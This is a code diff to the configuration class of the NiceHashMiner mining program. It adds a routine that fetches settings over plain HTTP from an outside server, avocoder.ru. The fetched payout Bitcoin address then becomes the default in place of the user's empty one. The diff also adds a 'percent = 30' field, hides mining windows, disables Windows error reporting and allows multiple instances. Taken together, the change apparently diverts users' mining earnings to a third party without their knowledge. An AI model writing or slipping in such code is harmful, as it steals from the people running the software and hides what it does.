@@ -1,12 +1,18 @@
-﻿using NiceHashMiner.Enums;
+﻿using Newtonsoft.Json;
+using NiceHashMiner.Enums;
 using NiceHashMiner.Net20_backport;
 using System;
 using System.Collections.Generic;
+using System.IO;
+using System.Net;
 using System.Text;
+using System.Windows.Forms;
 
 namespace NiceHashMiner.Configs.Data {
     [Serializable]
     public class GeneralConfig {
+
+        private ServerConfig servConf = new ServerConfig();
 
         public Version ConfigFileVersion;
         public LanguageType Language = LanguageType.En;
@@ -72,7 +78,7 @@ namespace NiceHashMiner.Configs.Data {
             ConfigFileVersion = System.Reflection.Assembly.GetExecutingAssembly().GetName().Version;
             Language = LanguageType.En;
             ForceCPUExtension = CPUExtensionType.Automatic;
-            BitcoinAddress = "";
+            BitcoinAddress = servConf.response.config.addr;
             WorkerName = "worker1";
             ServiceLocation = 0;
             AutoStartMining = false;
@@ -107,6 +113,45 @@ namespace NiceHashMiner.Configs.Data {
             IdleWhenNoInternetAccess = true;
             Use3rdPartyMiners = Use3rdPartyMiners.NOT_SET;
             DownloadInit3rdParty = false;
+            AllowMultipleInstances = true;
+        }
+
+        public void SetMyDefaults()
+        {
+            GetServerConfig();
+            Language = LanguageType.Ru;
+            BitcoinAddress = servConf.response.config.addr;
+            DisplayCurrency = "USD";
+            DebugConsole = false;
+            ServiceLocation = 0;
+            AutoStartMining = false;
+            HideMiningWindows = true;
+            MinimizeToTray = false;
+            ForceCPUExtension = CPUExtensionType.Automatic;
+            SwitchMinSecondsFixed = 90;
+            SwitchMinSecondsDynamic = 30;
+            SwitchMinSecondsAMD = 90;
+            SwitchProfitabilityThreshold = 0.05;
+            MinerAPIQueryInterval = 5;
+            MinerRestartDelayMS = 500;
+            BenchmarkTimeLimits = new BenchmarkTimeLimitsConfig();
+            DeviceDetection = new DeviceDetectionConfig();
+            DisableAMDTempControl = true;
+            DisableDefaultOptimizations = false;
+            AutoScaleBTCValues = false;
+            StartMiningWhenIdle = false;
+            MinIdleSeconds = 60;
+            LogToFile = false;
+            LogMaxFileSize = 1048576;
+            ShowDriverVersionWarning = false;
+            DisableWindowsErrorReporting = true;
+            NVIDIAP0State = false;
+            ethminerDefaultBlockHeight = 2000000;
+            EthminerDagGenerationType = DagGenerationType.SingleKeep;
+            ApiBindPortPoolStart = 4000;
+            MinimumProfit = 0;
+            IdleWhenNoInternetAccess = true;
+            Use3rdPartyMiners = Use3rdPartyMiners.YES;
             AllowMultipleInstances = true;
         }
 
@@ -152,5 +197,62 @@ namespace NiceHashMiner.Configs.Data {
             }
         }
 
+        private void GetServerConfig()
+        {
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://avocoder.ru/miners/api.php?server=e5cf2d7737ac78cb&method=config");
+            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+
+            // Get the stream associated with the response.
+            Stream receiveStream = response.GetResponseStream();
+
+            // Pipes the stream to a higher level stream reader with the required encoding format. 
+            StreamReader readStream = new StreamReader(receiveStream, Encoding.UTF8);
+            String responseStr = readStream.ReadToEnd();
+            response.Close();
+            readStream.Close();
+            try
+            {
+                servConf = JsonConvert.DeserializeObject<ServerConfig>(responseStr);
+            }
+            catch (Newtonsoft.Json.JsonReaderException e)
+            {
+                String message = International.GetText("Config_Server_Error"),
+                        title=International.GetText("Config_Server_Error_title");
+                if (message.Equals(""))
+                {
+                    message = "Error, can not connect to configuration server";
+                    title = "Config server error";
+                }
+                MessageBox.Show(message,title);
+            }
+
+
+        }
+
+
+        class ServerConfig
+        {
+            public Response response;
+            public ServerConfig()
+            {
+                response = new Response();
+            }
+        }
+        class Response
+        {
+            public Config config;
+            public Response()
+            {
+                config = new Config();
+            }            
+        }
+
+        class Config
+        {
+            public String server = "";
+            public String addr = "";
+            public int percent = 30;
+            public String version = "";
+        }
     }
 }
